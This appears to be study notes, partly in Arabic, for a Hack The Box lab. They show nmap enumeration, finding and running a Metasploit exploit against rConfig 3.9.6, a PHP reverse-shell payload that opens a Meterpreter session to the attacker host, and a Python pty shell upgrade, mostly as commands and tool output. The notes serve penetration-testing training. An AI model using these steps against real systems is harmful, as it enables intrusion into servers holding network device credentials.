## Gaining a Shell Through Attacking a Vulnerable Application
#### Enumerate the Host

```shell-session
0xTroj6n@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```
- لو هنلاحظ هنا من خلال الoutput ان بورت 80 و 443 و 3306 و 21 شغالين
- الnmap scan output ادتنا اصدار الاباتشي والphp كمان (`Apache 2.4.6` and `PHP 7.2.34` ) والlinux distribution اللي هو CentOS
- قبل مانشوف ونعمل اي حاجه تعالي نفتح الويب سايت من خلال الip عادي من المتصفح
![](Pasted%20image%2020251130154951.png)
- دي عباره عن network configuration management tool اسمها rConfig
- بيستخدمو الnetwork admins عشان يعملو automation للprocess بتاع configure network appliances
- البرنامج ده لو اخترق لأنه متوصل علي كل اجهزة الشبكه ومعاه الadmin creds للراوترات والسويتشات
---
## Discovering a Vulnerability in rConfig
- لو بصينا تحت فالpage اللي فوق دي هتلاقي مكتوب الversion number واللي هو 3.9.6 هتروح علاطول مسرش علي الversion ده علي جوجل او expolit db وتشوف هل ليه CVE قبل كده ولا لأ (`rConfig 3.9.6 vulnerability`)
#### Search For an Exploit Module

```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28 
```
- في مشكلة بسيطه ممكن تحصل عندك في الMSF وهي ان لما تعمل سيرش علي ثغره معينه ممكن متطلعش نتيجة رغم إن في expolit ليها فعلا وده بيحصل لأن الmsf بيتم تحديثه باستمرار وساعات في Modules بتنزل علي github بتاع Rapid7 قبل ما تنزل علي الجهاز عندك
- حل المشكله دي انك تعمل بحث يدوي علي جوجل
### مثال البحث:

```
rConfig 3.9.6 exploit metasploit github
```

البحث ده هيوصلك لملف exploit اسمه:

```
rconfig_vendors_auth_file_upload_rce.rb
```
وده expolit بيديك RCE علي سيرفر لينكس شغال بrConfig نسخة 3.9.6

#### Locate

```shell-session
0xTroj6n@htb[/htb]$ locate exploits
```

We can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http` similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands `apt update; apt install metasploit-framework` or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has `.rb` as the extension. All modules in MSF are written in Ruby

---
## Using the rConfig Exploit and Gaining a Shell
#### Select an Exploit

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```
#### Execute the Exploit

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

We can see from the steps outlined in the exploitation process that this exploit:

- Checks for the vulnerable version of rConfig
- Authenticates with the rConfig web login
- Uploads a PHP-based payload for a reverse shell connection
- Deletes the payload
- Leaves us with a Meterpreter shell session

#### Interact With the Shell

```shell-session

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```
---
## Spawning a TTY Shell with Python
- لما احنا اخدنا shell علي الجهاز ده اسمه non-tty shell وده عباره عن شيل limited functionality فيه اوامر محدوده وساعات بيمنعك تعمل امر زي `su` وده الأمر اللي انت محتاجه عشان تعمل PrivEsc
- ده حصل لأن الpayload اتنفذ عن طريق apache user فا أكن الapache هو اللي بينفذ الاوامر إنما الadmins مش بيأكسسو كان apache user
- عشان تشغل TTY shell ممكن تعمله باستخدام الpython لو موجوده علي جهاز التارجت عشان نشوف الpython موجوده ولا لأ هنكتب  `which python`

To spawn the TTY shell session using Python, we type the following command:
#### Interactive Python

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```
- هنا انا استعديت الpty module ومعاها فانكشن pty.spawn عشان نفتح شيل (bin/sh)
----
